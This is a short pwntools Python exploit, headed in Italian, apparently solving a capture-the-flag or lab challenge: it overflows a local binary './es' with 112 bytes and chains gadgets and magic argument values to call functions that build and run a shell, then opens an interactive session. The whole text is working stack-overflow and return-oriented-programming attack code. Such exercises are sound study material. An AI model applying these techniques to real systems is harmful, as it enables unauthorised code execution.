Exploit per il primo binario ricevuto:
```python
from pwn import *

# addresses of the functions
exec_string_addr = p32(0x80491b6)
add_bin_addr = p32(0x80491e5)
add_sh_addr = p32(0x8049236)

# pop instructions
pop_ret = p32(0x08049022)
pop_pop_ret = p32(0x08049233)

# magic strings
magic = p32(0xdeadbeef)
magic1 = p32(0xcafebabe)
magic2 = p32(0x0badf00d)

arg = b'A' * 112

# craft the payloads
payload = arg
payload += add_bin_addr
payload += pop_ret
payload += magic
payload += add_sh_addr
payload += pop_pop_ret
payload += magic1
payload += magic2
payload += exec_string_addr

bin = "./es"
p = process([bin, payload])
# p = gdb.debug([bin, payload], gdbscript="b main\nb *0x80492ba\nr")

p.interactive()
```
